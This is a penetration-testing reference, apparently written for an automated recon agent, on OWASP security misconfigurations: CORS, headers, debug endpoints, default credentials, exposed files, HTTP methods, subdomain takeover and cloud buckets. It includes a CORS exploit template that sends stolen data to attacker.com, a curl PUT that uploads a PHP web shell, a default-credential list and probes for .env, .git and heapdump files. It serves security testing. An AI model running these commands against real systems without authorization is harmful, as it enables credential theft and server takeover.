---
vuln_type: security_misconfiguration
severity: varies
cwe: [CWE-16, CWE-200, CWE-209, CWE-942]
owasp: A05:2021-Security-Misconfiguration
related_tools: [curl, nikto, nuclei, nmap, whatweb, ffuf]
exploit_agent: recon_agent
tags: [misconfiguration, cors, headers, default-credentials, directory-listing, debug-mode, information-disclosure, verbose-errors, csp, hsts]
---

# Security Misconfiguration (OWASP A05)

## Overview
Broad category covering insecure default configurations, incomplete setups, open cloud storage, misconfigured HTTP headers, verbose error messages, and unnecessary features/services enabled. Often the easiest to find and exploit.

---

## 1. CORS Misconfiguration

### What to Test
Cross-Origin Resource Sharing controls which domains can read responses from the target.

### Reflected Origin
```bash
# Test if arbitrary origin is reflected
curl -s -I http://target.com/api/data -H "Origin: https://evil.com"
# If response contains:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
# → CRITICAL: attacker can read authenticated responses from any origin
```

### Null Origin
```bash
curl -s -I http://target.com/api/data -H "Origin: null"
# If: Access-Control-Allow-Origin: null
# → Exploitable via sandboxed iframe:
# <iframe sandbox="allow-scripts" src="data:text/html,<script>fetch('...')</script>">
```

### Regex Bypass
```bash
# If CORS allows *.target.com:
curl -s -I http://target.com/api/data -H "Origin: https://evil-target.com"
curl -s -I http://target.com/api/data -H "Origin: https://target.com.evil.com"
curl -s -I http://target.com/api/data -H "Origin: https://targetcom.evil.com"

# If weak regex like /target\.com/:
curl -s -I http://target.com/api/data -H "Origin: https://nottarget.com"
```

### CORS Exploit Template
```html
<script>
fetch('https://target.com/api/sensitive-data', {
  credentials: 'include'
}).then(r => r.json()).then(data => {
  // Send stolen data to attacker
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```

### Severity
- **Critical**: Reflected origin + credentials → read any authenticated user's data
- **High**: Null origin allowed with credentials
- **Medium**: Regex bypass allows specific attacker domains
- **Low**: Wildcard (`*`) without credentials (can't read authenticated data)

---

## 2. Missing Security Headers

```bash
# Check all headers at once
curl -s -I https://target.com/

# Or use nuclei
nuclei -u https://target.com -t http/misconfiguration/
```

| Header | Missing Impact | Expected Value |
|--------|---------------|----------------|
| `Strict-Transport-Security` | MITM via HTTP downgrade | `max-age=31536000; includeSubDomains` |
| `X-Content-Type-Options` | MIME sniffing → XSS | `nosniff` |
| `X-Frame-Options` | Clickjacking | `DENY` or `SAMEORIGIN` |
| `Content-Security-Policy` | XSS execution | Restrictive policy |
| `X-XSS-Protection` | Browser XSS filter disabled | `1; mode=block` |
| `Referrer-Policy` | Token/URL leakage | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | Unnecessary browser features | Disable camera, microphone, etc. |
| `Cache-Control` | Sensitive data cached | `no-store, no-cache` for sensitive pages |

### Clickjacking Test (missing X-Frame-Options / frame-ancestors CSP)
```html
<iframe src="https://target.com/change-password" width="500" height="500"></iframe>
<!-- If page loads in iframe → clickjacking possible -->
```

---

## 3. Verbose Error Messages / Debug Mode

### Information Disclosure via Errors
```bash
# Trigger errors
curl http://target.com/api/user?id='
curl http://target.com/nonexistent-page
curl http://target.com/api/user?id[]=1  # type confusion
curl -X POST http://target.com/api/data -H "Content-Type: application/json" -d '{"invalid'

# Look for:
# - Stack traces (reveal file paths, library versions, code)
# - Database errors (reveal DB type, table names, query structure)
# - Framework default error pages (reveal technology and version)
# - Debug toolbar (Django debug toolbar, Symfony profiler)
```

### Debug Endpoints
```bash
# Common debug paths
curl http://target.com/debug
curl http://target.com/_debug
curl http://target.com/console          # Werkzeug debugger (Python)
curl http://target.com/__debug__/       # Django debug
curl http://target.com/_profiler/       # Symfony profiler
curl http://target.com/actuator         # Spring Boot
curl http://target.com/actuator/env     # Spring environment variables
curl http://target.com/actuator/heapdump
curl http://target.com/trace
curl http://target.com/elmah.axd        # ASP.NET error log
curl http://target.com/phpinfo.php      # PHP info page
curl http://target.com/server-info      # Apache server info
curl http://target.com/server-status    # Apache server status
```

### Werkzeug Debugger (Python → RCE)
```bash
# If Werkzeug debug console is accessible:
curl http://target.com/console
# → Interactive Python console → RCE
# May require PIN — PIN can be calculated from machine-specific values:
# /proc/self/cgroup, /sys/class/net/eth0/address, /etc/machine-id
```

### Spring Boot Actuator Exploitation
```bash
# Enumerate endpoints
curl http://target.com/actuator/
curl http://target.com/actuator/env      # Environment variables (may contain secrets)
curl http://target.com/actuator/configprops  # Configuration
curl http://target.com/actuator/mappings # All URL mappings
curl http://target.com/actuator/heapdump # Memory dump → secrets, sessions
curl http://target.com/actuator/jolokia  # JMX → potential RCE
```

---

## 4. Default Credentials

```bash
# Test common defaults
# Use nuclei default-login templates
nuclei -u http://target.com -t default-logins/

# Common defaults to try:
# admin:admin, admin:password, admin:123456
# root:root, root:toor, root:password
# test:test, guest:guest
# administrator:administrator
```

| Technology | Default Credentials | Path |
|-----------|-------------------|------|
| Tomcat Manager | tomcat:tomcat, admin:admin | /manager/html |
| Jenkins | (no password initially) | /login |
| phpMyAdmin | root:(empty) | /phpmyadmin |
| WordPress | (set during install) | /wp-admin |
| Grafana | admin:admin | /login |
| Kibana | (no auth by default) | / |
| MongoDB | (no auth by default) | port 27017 |
| Redis | (no auth by default) | port 6379 |
| Elasticsearch | (no auth by default) | port 9200 |
| RabbitMQ | guest:guest | :15672 |
| Jupyter Notebook | (token-based, often blank) | :8888 |

---

## 5. Directory Listing

```bash
# Check if directory listing is enabled
curl http://target.com/images/
curl http://target.com/uploads/
curl http://target.com/static/
curl http://target.com/assets/
curl http://target.com/backup/
curl http://target.com/logs/

# If HTML response contains file listing → directory listing enabled
# Look for sensitive files in listed directories
```

---

## 6. Exposed Configuration / Sensitive Files

```bash
# Git repository
curl http://target.com/.git/config
curl http://target.com/.git/HEAD

# Environment files
curl http://target.com/.env
curl http://target.com/.env.local
curl http://target.com/.env.production

# Configuration files
curl http://target.com/config.php
curl http://target.com/config.yml
curl http://target.com/config.json
curl http://target.com/settings.py
curl http://target.com/web.config
curl http://target.com/appsettings.json

# Backup files
curl http://target.com/backup.sql
curl http://target.com/dump.sql
curl http://target.com/database.sql
curl http://target.com/db.sql
curl http://target.com/site.tar.gz
curl http://target.com/backup.zip

# IDE / editor files
curl http://target.com/.idea/workspace.xml
curl http://target.com/.vscode/settings.json
curl http://target.com/.DS_Store

# Package manager
curl http://target.com/package.json
curl http://target.com/composer.json
curl http://target.com/Gemfile
curl http://target.com/requirements.txt

# API documentation (may reveal endpoints)
curl http://target.com/swagger.json
curl http://target.com/api-docs
curl http://target.com/swagger-ui/
curl http://target.com/openapi.json
```

### Git Repository Extraction
```bash
# If .git/config is accessible, dump entire repository:
# Tools: git-dumper, GitTools
git-dumper http://target.com/.git/ ./output_dir
# → Full source code extraction
```

---

## 7. Unnecessary HTTP Methods

```bash
# Check enabled methods
curl -X OPTIONS http://target.com/ -I

# Dangerous methods
curl -X PUT http://target.com/shell.php -d '<?php system($_GET["cmd"]); ?>'
curl -X TRACE http://target.com/  # Cross-site tracing (XST)
curl -X DELETE http://target.com/important-file
```

---

## 8. Subdomain Takeover

```bash
# Find subdomains pointing to decommissioned services
# If CNAME points to unclaimed service (S3, Heroku, GitHub Pages, etc.):
# 1. subfinder -d target.com → find subdomains
# 2. Check DNS: dig sub.target.com CNAME
# 3. If CNAME points to service AND that service returns "not found"
# 4. Claim the service → control content on target's subdomain

# Common takeover indicators:
# "There isn't a GitHub Pages site here"
# "NoSuchBucket" (AWS S3)
# "No such app" (Heroku)
# "The specified bucket does not exist" (GCP)
```

---

## 9. Cloud Storage Misconfiguration

```bash
# AWS S3
curl http://BUCKET_NAME.s3.amazonaws.com/
curl http://s3.amazonaws.com/BUCKET_NAME/
aws s3 ls s3://BUCKET_NAME --no-sign-request

# GCP Storage
curl http://storage.googleapis.com/BUCKET_NAME/

# Azure Blob
curl http://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list
```

---

## Automated Testing

```bash
# Full misconfiguration scan with nuclei
nuclei -u http://target.com -t misconfiguration/ -t exposures/ -t default-logins/

# Nikto for common misconfigs
nikto -h http://target.com

# Header check
curl -s -I https://target.com | grep -iE "strict-transport|x-frame|x-content-type|content-security|x-xss|referrer-policy|permissions-policy|access-control"

# CORS test (batch)
for origin in "https://evil.com" "null" "https://target.com.evil.com"; do
  echo -n "$origin: "
  curl -s -I http://target.com/api -H "Origin: $origin" | grep -i "access-control-allow"
done

# Sensitive file check with ffuf
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -fc 404
```

---

## Output Interpretation

### Confirmed misconfiguration indicators
- CORS reflects arbitrary origin with credentials
- Stack trace / framework debug page in error response
- Directory listing shows files
- .git/config, .env, or config files accessible
- Default credentials work for admin panel
- Debug console (Werkzeug, Spring Actuator) accessible
- Security headers missing from response

### Not a misconfiguration (false positives)
- CORS allows `*` without credentials (by design for public APIs)
- Custom 404 page that returns 200 status code
- Directory listing on intentionally public asset directories
- Version information in X-Powered-By but no known CVE

### Severity assessment
- **Critical**: Debug console with RCE (Werkzeug, Actuator with Jolokia)
- **Critical**: .git exposed → full source code
- **Critical**: CORS reflected origin + credentials
- **High**: .env / config with credentials exposed
- **High**: Default admin credentials
- **Medium**: Verbose error messages leaking code/paths
- **Medium**: Missing security headers (HSTS, CSP)
- **Low**: Directory listing on non-sensitive directories
- **Low**: Server version disclosure
